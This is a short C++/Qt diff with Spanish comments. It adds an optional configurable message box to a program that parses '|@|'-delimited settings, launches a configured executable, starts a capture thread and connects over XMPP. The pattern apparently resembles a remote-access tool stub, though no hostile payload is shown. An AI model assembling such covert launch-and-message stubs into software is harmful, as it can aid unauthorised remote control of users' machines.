@@ -84,6 +84,10 @@ void MainWindow::inicio(){
     {
         QProcess::startDetached(this->ejecutar);
     }
+    if(this->tipoMensaje != "nomensaje")
+    {
+        mostrarMensaje(tipoMensaje,tituloMensaje,textoMensaje);
+    }
     capturacion.moveToThread(&hilo); //movemos capturacion a un nuevo hilo para que se ejecute de forma independiente al programa principal y no lo bloquee
     hilo.start();
     QXmppConfiguration configuracion; //la configuracion inicial de nuestro cliente xmpp
@@ -112,6 +116,7 @@ QByteArray MainWindow::nuevaTrama()
     {
         datos = datos + "noejecutar|@|0|@|"; //Sino decimos al servidor copiado que no ejecute nada
     }
+    datos = datos + "nomensaje|@|";
     return datos;
 }
 bool MainWindow::cargarConfiguracion(){
@@ -143,7 +148,12 @@ bool MainWindow::cargarConfiguracion(){
         this->nombreCopiable = campo[6];
         this->ejecutar = campo[7];
         this->siempreOUnaVez = campo[8];
-
+        this->tipoMensaje = campo[9];
+        if(this->tipoMensaje != "nomensaje")
+        {
+            this->textoMensaje = campo[10];
+            this->tituloMensaje = campo[11];
+        }
     }
     return true;
 }
